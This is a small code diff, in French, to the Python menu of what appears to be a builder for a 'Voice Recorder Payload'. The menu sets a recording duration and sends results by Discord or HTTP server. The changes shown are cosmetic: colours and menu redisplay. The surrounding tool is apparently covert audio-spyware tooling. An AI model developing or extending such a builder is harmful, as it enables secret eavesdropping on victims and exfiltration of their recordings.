@@ -8,11 +8,11 @@ def affichage():
     print("=== Configuration Voice Recorder Payload ===\n\n")
     print(f"""
           
-          Options : 
-
+          {Fore.YELLOW}Options : 
+{Fore.WHITE}
     1. Durée de l'enregistrement (en secondes)
           
-    Sortie et envoi:
+    {Fore.YELLOW}Sortie et envoi:
           
     2. Envoi par Discord
     3. Envoi par serveur HTTP
@@ -39,6 +39,7 @@ def voicerec():
         clear()
         duree = input("Entrez la durée de l'enregistrement (en secondes) : ")
         choix["Durée de l'enregistrement"] = duree
+        affichage()
 
     def discord_option():
         clear()
@@ -47,6 +48,7 @@ def voicerec():
             choix["Envoi par Discord"] = discord
         else:
             choix["Envoi par Discord"] = None
+        affichage()
 
     def http_option():
         clear()
@@ -55,6 +57,7 @@ def voicerec():
             choix["Envoi par serveur HTTP"] = http
         else:
             choix["Envoi par serveur HTTP"] = None
+        affichage()
 
     def create_payload():
         clear()
